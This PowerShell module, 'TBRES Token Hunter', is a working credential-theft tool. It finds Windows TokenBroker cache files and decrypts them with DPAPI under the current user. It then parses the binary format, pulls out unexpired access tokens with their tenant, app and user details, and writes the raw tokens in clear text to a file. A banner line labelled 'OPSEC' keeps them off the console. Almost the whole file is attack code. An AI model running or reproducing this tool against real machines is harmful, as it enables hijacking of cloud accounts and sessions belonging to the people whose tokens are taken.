# modules\TbresTokenHunter.ps1
# TBRES Token Hunter integrated into SATO (module-safe)

Add-Type -AssemblyName System.Security

# anchor so we can find appId-map.psd1 regardless of cwd
if (-not $script:ThisModuleRoot) {
    $script:ThisModuleRoot = Split-Path -Parent $PSCommandPath
}

# -------------------- Banner & Summary --------------------

function Show-Banner {
    param(
        [string]$TargetPath,
        [bool]$IncludeExpiredFlag,
        [string[]]$ResourceFilterValues
    )

    $name    = 'TBRES Token Hunter'
    $version = 'v0.1'
    $tsUtc   = (Get-Date).ToUniversalTime().ToString("yyyy-MM-dd HH:mm:ss 'UTC'")
    $userHost= "$($env:USERNAME)@$($env:COMPUTERNAME)"
    $psver   = $PSVersionTable.PSVersion.ToString()
    $rfCount = if ($ResourceFilterValues) { $ResourceFilterValues.Count } else { 0 }

    if ($rfCount -gt 3) {
        $preview = ($ResourceFilterValues[0..2] -join ', ') + ", +$($rfCount-3) more"
    } elseif ($rfCount -gt 0) {
        $preview = ($ResourceFilterValues -join ', ')
    } else {
        $preview = '-'
    }

    $rule = ('=' * 72)

    Write-Host $rule -ForegroundColor DarkGray
    Write-Host ("{0} {1}" -f $name, $version) -ForegroundColor Magenta
    Write-Host $rule -ForegroundColor DarkGray
    Write-Host ("[*] Time (UTC)     : {0}" -f $tsUtc) -ForegroundColor Cyan
    Write-Host ("[*] User@Host      : {0}" -f $userHost) -ForegroundColor Cyan
    Write-Host ("[*] PowerShell     : {0}" -f $psver) -ForegroundColor Cyan
    Write-Host ("[*] Target Path    : {0}" -f $TargetPath) -ForegroundColor Cyan
    Write-Host ("[*] IncludeExpired : {0}" -f $IncludeExpiredFlag) -ForegroundColor Cyan
    Write-Host ("[*] ResourceFilter : {0}" -f $preview) -ForegroundColor Cyan
    Write-Host $rule -ForegroundColor DarkGray
    Write-Host "[!] OPSEC: Tokens are written to file only; not printed to console." -ForegroundColor Yellow
    Write-Host $rule -ForegroundColor DarkGray
    Write-Host ""
}

function Show-Summary {
    param(
        [Parameter(Mandatory=$true)][pscustomobject]$Stats,
        [Parameter(Mandatory=$true)][object[]]$Tokens,
        [Parameter(Mandatory=$true)][TimeSpan]$Elapsed,
        [Parameter(Mandatory=$true)][string]$OutputFilePath
    )

    $rule = ('=' * 72)

    $uniqueTenants   = ($Tokens | Where-Object { $_.TenantId }   | Select-Object -ExpandProperty TenantId   -Unique).Count
    $uniqueResources = ($Tokens | Where-Object { $_.ResourceId } | Select-Object -ExpandProperty ResourceId -Unique).Count

    $tenantList = @()
    if ($Tokens -and $Tokens.Count -gt 0) {
        $tenantGroups = ($Tokens | Where-Object { $_.TenantId }) | Group-Object TenantId
        foreach ($g in $tenantGroups) {
            $sample = $Tokens | Where-Object { $_.TenantId -eq $g.Name } | Select-Object -First 1
            $tenantList += [pscustomobject]@{
                TenantId   = $g.Name
                TenantName = $sample.TenantName
                Count      = $g.Count
            }
        }
        $tenantList = $tenantList | Sort-Object Count -Descending
    }

    $resourceList = @()
    if ($Tokens -and $Tokens.Count -gt 0) {
        $resourceGroups = ($Tokens | Where-Object { $_.ResourceId }) | Group-Object ResourceId
        foreach ($g in $resourceGroups) {
            $sample = $Tokens | Where-Object { $_.ResourceId -eq $g.Name } | Select-Object -First 1
            $resourceList += [pscustomobject]@{
                ResourceId   = $g.Name
                ResourceName = $sample.ResourceName
                Count        = $g.Count
            }
        }
        $resourceList = $resourceList | Sort-Object Count -Descending
    }

    $filesWithTokens = @()
    if ($Tokens -and $Tokens.Count -gt 0) {
        $filesWithTokens = ($Tokens | Where-Object { $_.File }) | Select-Object -ExpandProperty File -Unique
    }

    $maxTenantsToShow   = 5
    $maxResourcesToShow = 5
    $maxFilesToShow     = 8

    Write-Host ""
    Write-Host $rule -ForegroundColor DarkGray
    Write-Host "SUMMARY" -ForegroundColor Magenta
    Write-Host $rule -ForegroundColor DarkGray

    Write-Host ("[+] Files scanned      : {0}" -f $Stats.TotalFiles) -ForegroundColor Green
    Write-Host ("[+] Valid tokens       : {0}" -f $Stats.Valid) -ForegroundColor Green
    Write-Host ("[~] Expired skipped    : {0}" -f $Stats.ExpiredSkipped) -ForegroundColor Yellow
    Write-Host ("[x] Parse/other errors : {0}" -f $Stats.Errors) -ForegroundColor Red
    Write-Host ("[*] Unique tenants     : {0}" -f $uniqueTenants) -ForegroundColor Cyan
    Write-Host ("[*] Unique resources   : {0}" -f $uniqueResources) -ForegroundColor Cyan
    Write-Host ("[*] Elapsed            : {0}" -f $Elapsed) -ForegroundColor Cyan
    Write-Host ("[*] Output file        : {0}" -f $OutputFilePath) -ForegroundColor Cyan

    if ($tenantList.Count -gt 0) {
        Write-Host $rule -ForegroundColor DarkGray
        Write-Host "Tenants (by tokens):" -ForegroundColor Cyan
        $take = [Math]::Min($maxTenantsToShow, $tenantList.Count)
        for ($i = 0; $i -lt $take; $i++) {
            $t = $tenantList[$i]
            $label = if ($t.TenantName) { "{0} ({1})" -f $t.TenantName, $t.TenantId } else { $t.TenantId }
            Write-Host (" - {0}  [{1} token{2}]" -f $label, $t.Count, $(if ($t.Count -ne 1) { 's' } else { '' })) -ForegroundColor Cyan
        }
        if ($tenantList.Count -gt $take) {
            Write-Host ("   ... +{0} more" -f ($tenantList.Count - $take)) -ForegroundColor Cyan
        }
    }

    if ($resourceList.Count -gt 0) {
        Write-Host $rule -ForegroundColor DarkGray
        Write-Host "Resources (by tokens):" -ForegroundColor Cyan
        $take = [Math]::Min($maxResourcesToShow, $resourceList.Count)
        for ($i = 0; $i -lt $take; $i++) {
            $r = $resourceList[$i]
            $label = if ($r.ResourceName) { "{0} ({1})" -f $r.ResourceName, $r.ResourceId } else { $r.ResourceId }
            Write-Host (" - {0}  [{1} token{2}]" -f $label, $r.Count, $(if ($r.Count -ne 1) { 's' } else { '' })) -ForegroundColor Cyan
        }
        if ($resourceList.Count -gt $take) {
            Write-Host ("   ... +{0} more" -f ($resourceList.Count - $take)) -ForegroundColor Cyan
        }
    }

    if ($filesWithTokens.Count -gt 0) {
        Write-Host $rule -ForegroundColor DarkGray
        Write-Host "Files with valid tokens:" -ForegroundColor Green
        $take = [Math]::Min($maxFilesToShow, $filesWithTokens.Count)

        for ($i = 0; $i -lt $take; $i++) {
            $full = $filesWithTokens[$i]
            $leaf = Split-Path $full -Leaf
            Write-Host (" - {0}" -f $leaf) -ForegroundColor Green
        }
        if ($filesWithTokens.Count -gt $take) {
            Write-Host ("   ... +{0} more" -f ($filesWithTokens.Count - $take)) -ForegroundColor Green
        }
    }

    if ($Stats.Warns -and $Stats.Warns.Count -gt 0) {
        Write-Host $rule -ForegroundColor DarkGray
        Write-Host "Top error/warning reasons:" -ForegroundColor Yellow
        $top = $Stats.Warns | Group-Object | Sort-Object Count -Descending | Select-Object -First 3
        foreach ($g in $top) {
            Write-Host (" - {0} : {1}" -f $g.Name, $g.Count) -ForegroundColor Yellow
        }
    }

    Write-Host $rule -ForegroundColor DarkGray
    Write-Host ""
}

# -------------------- AppId map loader --------------------

function Resolve-AppIdMapPath {
    param([string]$FileName = 'appId-map.psd1')

    $candidates = @()
    if ($script:ThisModuleRoot) { $candidates += (Join-Path $script:ThisModuleRoot $FileName) }
    if ($PSScriptRoot)         { $candidates += (Join-Path $PSScriptRoot         $FileName) }
    if ($PSCommandPath)        { $candidates += (Join-Path (Split-Path -Parent $PSCommandPath) $FileName) }
    $candidates += (Join-Path (Get-Location).Path $FileName)
    if ($env:TBRES_APPID_MAP)  { $candidates = @($env:TBRES_APPID_MAP) + $candidates }

    foreach ($p in $candidates | Select-Object -Unique) {
        if ($p -and (Test-Path -LiteralPath $p)) { return $p }
    }
    return $null
}

$script:__AppIdMap           = $null
$script:__AppIdMap_LastPath  = $null
$script:__AppIdMap_LastMtime = $null
$script:__AppIdMap_Warned    = $false

function Load-AppIdMap {
    $path = Resolve-AppIdMapPath

    if (-not $path) {
        if (-not $script:__AppIdMap_Warned) {
            Write-Warning "AppId map file not found in module or current directory (and TBRES_APPID_MAP not set)."
            $script:__AppIdMap_Warned = $true
        }
        $script:__AppIdMap           = @{}
        $script:__AppIdMap_LastPath  = $null
        $script:__AppIdMap_LastMtime = $null
        return $script:__AppIdMap
    }

    $mtime = (Get-Item -LiteralPath $path).LastWriteTimeUtc
    $mustReload = $false
    if ($null -eq $script:__AppIdMap)            { $mustReload = $true }
    if ($script:__AppIdMap_LastPath -ne $path)   { $mustReload = $true }
    if ($script:__AppIdMap_LastMtime -ne $mtime) { $mustReload = $true }

    if ($mustReload) {
        try {
            $raw = Import-PowerShellDataFile -Path $path
        } catch {
            if (-not $script:__AppIdMap_Warned) {
                Write-Warning "Failed to load appId map '$path': $($_.Exception.Message)"
                $script:__AppIdMap_Warned = $true
            }
            $raw = @{}
        }

        $norm = @{}
        foreach ($entry in $raw.GetEnumerator()) {
            $norm[$entry.Key.ToString().ToLower()] = $entry.Value.ToString()
        }

        $script:__AppIdMap           = $norm
        $script:__AppIdMap_LastPath  = $path
        $script:__AppIdMap_LastMtime = $mtime
    }

    return $script:__AppIdMap
}

function Get-ApplicationNameById {
    param([Parameter(Mandatory = $true)][string]$AppId)
    if ([string]::IsNullOrWhiteSpace($AppId)) { return $null }
    $map = Load-AppIdMap
    $name = $map[$AppId.ToLower()]
    if ($name) { return $name }
    return $null
}

# -------------------- Core TBRES logic --------------------

Function Parse-TBRES {
    [cmdletbinding()]
    param(
        [parameter(Mandatory = $true, ValueFromPipeline)]
        [byte[]]$Data
    )
    Process {
        $json = [text.encoding]::Unicode.GetString($Data, 0, $Data.Length).TrimEnd(0x00) | ConvertFrom-Json
        $txtEncrypted = $json.TBDataStoreObject.ObjectData.SystemDefinedProperties.ResponseBytes.Value
        $binEncrypted = Convert-B64ToByteArray -B64 $txtEncrypted
        if ($json.TBDataStoreObject.ObjectData.SystemDefinedProperties.ResponseBytes.IsProtected) {
            $binDecrypted = [Security.Cryptography.ProtectedData]::Unprotect($binEncrypted, $null, 'CurrentUser')
        } else {
            $binDecrypted = $binEncrypted
        }
        $fileTimeUtc = [BitConverter]::ToUInt64((Convert-B64ToByteArray $json.TBDataStoreObject.ObjectData.SystemDefinedProperties.Expiration.Value), 0)
        $expires = [datetime]::FromFileTimeUtc($fileTimeUtc)
        if ((Get-Date).ToUniversalTime() -ge $expires) {
            Write-Warning "Token is expired"
            return
        }
        return Parse-TBRESResponseBytes -Data $binDecrypted
    }
}

Function Parse-TBRESResponseBytes {
    param([parameter(Mandatory = $true, ValueFromPipeline)][byte[]]$Data)
    Begin {}
    Process {
        Function Parse-TBRESVersion {
            [cmdletbinding()]
            param(
                [parameter(Mandatory = $true, ValueFromPipeline)][byte[]]$Data,
                [parameter(Mandatory = $true, ValueFromPipeline)][ref]$Position,
                [parameter(Mandatory = $false, ValueFromPipeline)][int[]]$ExpectedVersions = @(1, 2)
            )
            Process {
                $p = $Position.Value
                $version = [BitConverter]::ToUInt32($Data[($p + 3)..$p], 0); $p += 4
                if ($ExpectedVersions -notcontains $version) {
                    Throw "Invalid version $version, expected one of $($ExpectedVersions -join ',')"
                }
                $Position.Value = $p
            }
        }

        Function Parse-TBRESKeyValue {
            [cmdletbinding()]
            param(
                [parameter(Mandatory = $true, ValueFromPipeline)][byte[]]$Data,
                [parameter(Mandatory = $true, ValueFromPipeline)][ref]$Position
            )
            Process {
                $p = $Position.Value
                $keyType = [BitConverter]::ToUInt32($Data[($p + 3)..$p], 0); $p += 4
                if ($keyType -ne 0x0c) { Throw "Invalid key type $keyType" }
                $keyLength = [BitConverter]::ToUInt32($Data[($p + 3)..$p], 0); $p += 4
                $binKey = $Data[$p..($p + $keyLength - 1)]; $p += $keyLength
                $key = [text.encoding]::UTF8.GetString($binKey)
                $valueType = [BitConverter]::ToUInt32($Data[($p + 3)..$p], 0); $p += 4
                switch ($valueType) {
                    0x0C { $valueLength = [BitConverter]::ToUInt32($Data[($p + 3)..$p], 0); $p += 4; $value = [text.encoding]::UTF8.GetString($Data, $p, $valueLength); $p += $valueLength; break }
                    0x04 { $value = [BitConverter]::ToUInt32($Data[($p + 3)..$p], 0); $p += 4; break }
                    0x05 { $value = [BitConverter]::ToUInt32($Data[($p + 3)..$p], 0); $p += 4; break }
                    0x06 { $timestamp = [BitConverter]::ToUInt64($Data[($p + 7)..$p], 0); $p += 8; $value = [datetime]::FromFileTimeUtc($timestamp); break }
                    0x07 { $value = [BitConverter]::ToUInt64($Data[($p + 7)..$p], 0); $p += 8; break }
                    0x0D { $value = [guid][byte[]]$Data[$p..($p + 15)]; $p += 16; break }
                    1025 {
                        if ($binKey.Length -eq 1 -and $binKey[0] -gt 1) {
                            Write-Verbose "Content identifier $($binKey[0]), getting the next Key-Value."
                            $length = [BitConverter]::ToUInt32($Data[($p + 3)..$p], 0); $p += 4
                            Parse-TBRESVersion -Data $Data -Position ([ref]$p)
                            $next = Parse-TBRESKeyValue -Data $Data -Position ([ref]$p)
                            $key = $next.Key; $value = $next.Value; break
                        }
                        break
                    }
                    default { Write-Verbose "Unknown value type $valueType"; $value = $valueType; break }
                }
                $Position.Value = $p
                return [PSCustomObject][ordered]@{ "Key" = $key; "Value" = $value }
            }
        }

        Function Parse-TBRESElement {
            [cmdletbinding()]
            param(
                [parameter(Mandatory = $true, ValueFromPipeline)][byte[]]$Data,
                [parameter(Mandatory = $true, ValueFromPipeline)][ref]$Position,
                [parameter(Mandatory = $false, ValueFromPipeline)][PSCustomObject]$Element
            )
            Process {
                $p = $Position.Value
                $value = $null
                if (!$Element) { $element = Parse-TBRESKeyValue -Data $Data ([ref]$p) }
                Write-Debug $element
                $elementLength = [BitConverter]::ToUInt32($Data[($p + 3)..$p], 0); $p += 4

                if ($element.Key -eq "WTRes_Error") {
                    Write-Verbose "WTRes_Error file, skipping.."
                    return $null
                }
                elseif ($element.Key -eq "WTRes_Token") {
                    Write-Verbose "Parsing WTRes_Token"
                    $p -= 4
                    $status = Parse-TBRESKeyValue -Data $Data ([ref]$p)
                    if ($status.Value -ne 0) { Write-Warning "WTRes_Token status $($status.Value)" }
                    $value = $element.Value
                }
                else {
                    $propertyBagStart = $p
                    Write-Verbose "Parsing $($element.Key), $elementLength bytes"
                    Parse-TBRESVersion -Data $Data -Position ([ref]$p)
                    $properties = [ordered]@{}
                    While ($p -lt ( $propertyBagStart + $elementLength)) {
                        $property = Parse-TBRESKeyValue -Data $Data ([ref]$p)
                        if ($property.Key -eq "WA_Properties" -or $property.Key -eq "WA_Provier") {
                            $property.Value = Parse-TBRESElement -Data $Data ([ref]$p) -Element $property
                        }
                        $properties[$property.Key] = $property.Value
                    }
                    $value = [PSCustomObject]$properties
                }

                $Position.Value = $p
                return [PSCustomObject][ordered]@{ "Key" = $element.Key; "Value" = $value }
            }
        }

        $p = 0
        Parse-TBRESVersion -Data $Data -Position ([ref]$p)
        $expiration = (Parse-TBRESKeyValue -Data $Data ([ref]$p)).value
        $responses  = (Parse-TBRESKeyValue -Data $Data ([ref]$p)).value
        $responseLen = [BitConverter]::ToUInt32($Data[($p + 3)..$p], 0); $p += 4
        Parse-TBRESVersion -Data $Data -Position ([ref]$p)
        Parse-TBRESKeyValue -Data $Data ([ref]$p)
        $contentLength = [BitConverter]::ToUInt32($Data[($p + 3)..$p], 0); $p += 4
        $contentStart = $p
        Parse-TBRESVersion -Data $Data -Position ([ref]$p)

        $properties = [ordered]@{}
        while ($p -le ($contentStart + $contentLength)) {
            try {
                $element = Parse-TBRESElement -Data $Data -Position ([ref]$p)
                if ($null -eq $element) { return $null }
                $properties[$element.Key] = $element.Value
            } catch {
                Write-Verbose "Got exception: $($_.Exception.Message)"
                break
            }
        }
        return [PSCustomObject]$properties
    }
}

function Convert-B64ToByteArray {
    [CmdletBinding()]
    param([Parameter(Mandatory = $true)][string]$B64)
    return [Convert]::FromBase64String($B64)
}

function Get-TBRESFiles {
    param([string]$DirectoryPath)
    return Get-ChildItem -Path $DirectoryPath -Filter *.tbres -File -Recurse
}

function Get-AudFromAccessToken {
    param ([string]$AccessToken)
    try {
        $tokenParts = $AccessToken.Split('.')
        if ($tokenParts.Length -ne 3) { Write-Warning "Invalid access token format."; return $null }
        $payload = $tokenParts[1]
        $padding = 4 - ($payload.Length % 4)
        if ($padding -ne 4) { $payload += ("=" * $padding) }
        $decodedPayload = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))
        $claims = ConvertFrom-Json -InputObject $decodedPayload
        return $claims.aud
    } catch {
        Write-Warning "Error parsing access token: $($_.Exception.Message)"
        return $null
    }
}

function Get-DecryptedTBRES {
    param([string]$FilePath)
    try {
        $rawBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $parsed = Parse-TBRES -Data $rawBytes
        if ($null -ne $parsed) {
            $aud = Get-AudFromAccessToken -AccessToken $parsed.WTRes_Token
            return [PSCustomObject]@{
                File         = $FilePath
                TenantId     = $parsed.WTRes_Account.WA_Properties.Value.TenantId
                TenantName   = $parsed.WTRes_PropertyBag.tenant_display_name
                ResourceId   = $aud
                ResourceName = if (![string]::IsNullOrEmpty($aud)) { Get-ApplicationNameById -AppId $aud } else { $null }
                AppId        = $parsed.WTRes_PropertyBag.aud
                AppName      = if (![string]::IsNullOrEmpty($parsed.WTRes_PropertyBag.aud)) { Get-ApplicationNameById -AppId $parsed.WTRes_PropertyBag.aud } else { $null }
                Claims       = $parsed.WTRes_PropertyBag.amr
                Expires      = $parsed.WTRes_PropertyBag.exp
                Token        = $parsed.WTRes_Token
                ProviderId   = $parsed.WTRes_Account.WA_Provier.Value.WAP_Id
                UserName     = $parsed.WTRes_Account.WA_UserName
            }
        }
    } catch {
        Write-Warning "Failed to parse $FilePath : $($_.Exception.Message)"
    }
    return $null
}

function Get-ValidTokensFromTBRES {
    <#
    .SYNOPSIS
        Finds and extracts valid tokens from TokenBroker cache files, with progress and stats.
    #>
    param(
        [string]$TBRESDirectory = (Join-Path $env:USERPROFILE 'AppData\Local\Microsoft\TokenBroker\Cache'),
        [switch]$IncludeExpired,
        [string[]]$ResourceFilter
    )

    $results         = @()
    $files           = Get-TBRESFiles -DirectoryPath $TBRESDirectory
    $total           = if ($files) { $files.Count } else { 0 }

    $desiredTotalDelayMs = 2000
    $delayMs = if ($total -gt 0) { [int][Math]::Min(50, [Math]::Ceiling($desiredTotalDelayMs / $total)) } else { 0 }

    $scanned         = 0
    $validCount      = 0
    $expiredSkipped  = 0
    $errors          = 0

    $warns = @()

    foreach ($file in $files) {
        $scanned++
        $currentName = $file.Name

        $result = $null
        try {
            $result = Get-DecryptedTBRES -FilePath $file.FullName -WarningVariable +warns
        } catch {
            $errors++
            $result = $null
        }

        if ($null -ne $result -and $result.Token) {
            if (-not $IncludeExpired -and $null -ne $result.Expires -and ($result.Expires -is [datetime])) {
                if ($result.Expires -lt (Get-Date).ToUniversalTime()) {
                    $expiredSkipped++
                    $percent = if ($total -gt 0) { [int](($scanned / $total) * 100) } else { 100 }
                    $status  = "[{0}/{1}] Valid:{2} | Expired skipped:{3} | Errors:{4} | Current:{5}" -f $scanned,$total,$validCount,$expiredSkipped,$errors,$currentName
                    Write-Progress -Activity "Scanning TBRES files" -Status $status -PercentComplete $percent
                    if ($delayMs -gt 0) { Start-Sleep -Milliseconds $delayMs }
                    continue
                }
            }

            if ($ResourceFilter -and $result.ResourceId) {
                if ($ResourceFilter -contains $result.ResourceId) {
                    $results += $result
                    $validCount++
                }
            } else {
                $results += $result
                $validCount++
            }
        } else {
            $errors++
        }

        $percent = if ($total -gt 0) { [int](($scanned / $total) * 100) } else { 100 }
        $status  = "[{0}/{1}] Valid:{2} | Expired skipped:{3} | Errors:{4} | Current:{5}" -f $scanned,$total,$validCount,$expiredSkipped,$errors,$currentName
        Write-Progress -Activity "Scanning TBRES files" -Status $status -PercentComplete $percent
        if ($delayMs -gt 0) { Start-Sleep -Milliseconds $delayMs }
    }

    Write-Progress -Activity "Scanning TBRES files" -Completed

    return [PSCustomObject]@{
        Tokens = $results
        Stats  = [PSCustomObject]@{
            TotalFiles     = $total
            Scanned        = $scanned
            Valid          = $validCount
            ExpiredSkipped = $expiredSkipped
            Errors         = $errors
            Warns          = $warns
        }
    }
}

function Export-TokensToFile {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)][object[]]$Tokens,
        [string]$OutputFilePath = "validTokens.txt"
    )

    $Tokens | ForEach-Object {
        "File=$($_.File)"
        "TenantId=$($_.TenantId)"
        "TenantName=$($_.TenantName)"
        "ResourceId=$($_.ResourceId)"
        "ResourceName=$($_.ResourceName)"
        "AppId=$($_.AppId)"
        "AppName=$($_.AppName)"
        "Claims=$($_.Claims)"
        "Expires=$($_.Expires)"
        "ProviderId=$($_.ProviderId)"
        "UserName=$($_.UserName)"
        "Token=$($_.Token)"
        "-------------------"
    } | Out-File -FilePath $OutputFilePath -Encoding UTF8

    Write-Host "[+] Valid tokens written to: $OutputFilePath"
}

# -------------------- Public entrypoint --------------------

function Invoke-TbresTokenHunter {
    [CmdletBinding()]
    param(
        [string]$TBRESDirectory = (Join-Path $env:USERPROFILE 'AppData\Local\Microsoft\TokenBroker\Cache'),
        [switch]$IncludeExpired,
        [string[]]$ResourceFilter,
        [string]$OutputFilePath = "validTokens.txt"
    )

    Show-Banner -TargetPath $TBRESDirectory `
                -IncludeExpiredFlag $IncludeExpired.IsPresent `
                -ResourceFilterValues $ResourceFilter

    $sw   = [System.Diagnostics.Stopwatch]::StartNew()
    $scan = Get-ValidTokensFromTBRES -TBRESDirectory $TBRESDirectory -IncludeExpired:$IncludeExpired -ResourceFilter $ResourceFilter
    $tokens = $scan.Tokens
    $sw.Stop()

    if ($tokens -and $tokens.Count -gt 0) {
        Export-TokensToFile -Tokens $tokens -OutputFilePath $OutputFilePath
    } else {
        Write-Warning "[!] No valid tokens found in path: $TBRESDirectory"
    }

    Show-Summary -Stats $scan.Stats -Tokens $tokens -Elapsed $sw.Elapsed -OutputFilePath $OutputFilePath
}

Export-ModuleMember -Function Invoke-TbresTokenHunter, Get-ApplicationNameById
